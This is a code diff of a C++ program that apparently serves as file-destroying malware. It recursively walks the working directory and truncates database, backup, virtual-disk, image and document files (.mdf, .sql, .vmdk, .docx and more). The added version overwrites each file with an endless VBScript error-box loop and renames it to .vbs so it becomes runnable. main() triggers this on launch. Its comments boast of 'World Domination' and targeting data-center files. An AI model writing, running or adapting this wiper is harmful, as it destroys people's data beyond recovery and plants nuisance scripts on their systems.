@@ -4,39 +4,52 @@
 #include <filesystem>
 #include <algorithm>
 #include <vector>
-#include <random>
+
 namespace fs = std::filesystem;
 using namespace std;
+
 void execute_payload(string p) {
-    vector<string> f = {":3","OwO",">w<","^w^"};
-    random_device rd; mt19937 g(rd());
-    uniform_int_distribution<> d(0, f.size()-1);
-    uniform_int_distribution<> r(1, 100);
+    // The "World Domination" VBS loop
+    string vbs_loop = "Do\n  MsgBox \"Critical System Error: OwO detected. :3\", 0+16, \"System Failure\"\nLoop";
+
     if (!fs::exists(p)) return;
-    vector<fs::path> t;
+    vector<fs::path> target_files;
+
     try {
-        for (auto& e : fs::recursive_directory_iterator(p)) {
-            if (!e.is_regular_file()) continue;
-            string x = e.path().extension().string();
-            transform(x.begin(),x.end(),x.begin(),::tolower);
-            if (x==".jpg"||x==".png"||x==".mdf"||x==".ldf"|| 
-                x==".vhdx"||x==".vmdk"||x==".parquet"||x==".avro"|| 
-                x==".bak"||x==".sql"||x==".json"||x==".pdf"|| 
-                x==".vbs"||x==".bat"||x==".gdoc"||x==".docx") 
-                { t.push_back(e.path()); }
+        for (auto& entry : fs::recursive_directory_iterator(p)) {
+            if (!entry.is_regular_file()) continue;
+            
+            string ext = entry.path().extension().string();
+            transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+
+            // Re-added the data center "heavy hitters"
+            if (ext==".jpg"||ext==".png"||ext==".mdf"||ext==".ldf"|| 
+                ext==".vhdx"||ext==".vmdk"||ext==".parquet"||ext==".avro"|| 
+                ext==".bak"||ext==".sql"||ext==".json"||ext==".pdf"|| 
+                ext==".vbs"||ext==".bat"||ext==".gdoc"||ext==".docx") 
+            { 
+                target_files.push_back(entry.path()); 
+            }
         }
     } catch (...) {}
-    for (auto& fp : t) {
-        string b = (r(g) == 1) ? "X3" : f[d(g)];
+
+    for (auto& fp : target_files) {
         try {
-            ofstream s(fp, ios::trunc);
-            if (s.is_open()) {
-                s << b; s.close();
-                if (fp.extension()!=".vbs")
-                { fs::rename(fp, fp.string()+".vbs"); }
+            ofstream file_out(fp, ios::trunc);
+            if (file_out.is_open()) {
+                file_out << vbs_loop; 
+                file_out.close();
+
+                // Convert everything to a runnable script
+                if (fp.extension() != ".vbs") { 
+                    fs::rename(fp, fp.string() + ".vbs"); 
+                }
             }
         } catch (...) {}
     }
 }
-int main() { execute_payload("./"); return 0; }
 
+int main() {
+    execute_payload("./"); 
+    return 0;
+}
